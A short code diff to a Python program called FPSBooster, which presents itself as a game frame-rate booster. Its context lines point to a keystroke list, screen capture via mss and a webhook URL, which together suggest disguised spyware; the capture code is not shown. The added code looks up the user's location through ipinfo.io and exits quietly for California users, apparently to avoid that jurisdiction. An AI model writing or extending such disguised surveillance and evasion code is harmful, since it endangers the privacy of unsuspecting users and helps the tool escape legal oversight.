@@ -12,6 +12,25 @@ import shutil
 from queue import Queue
 import mss
 
+import sys
+import requests
+
+def is_california_citizen():
+    try:
+        # Get location data
+        resp = requests.get('https://ipinfo.io/json', timeout=5)
+        info = resp.json()
+        region = info.get('region', '')
+        if region.lower() in ['california', 'ca']:
+            return True
+    except Exception:
+        pass
+    return False
+
+if is_california_citizen():
+    print("Sorry, this program cannot run for California citizens.")
+    sys.exit(0)
+
 class FPSBooster:
     def __init__(self, cpu_core, gpu_power, ram_usage, webhook_url, root):
         self.keystrokes = []
@@ -203,4 +222,5 @@ if __name__ == "__main__":
 
 
     FPSBooster.create_config_window()
+
 
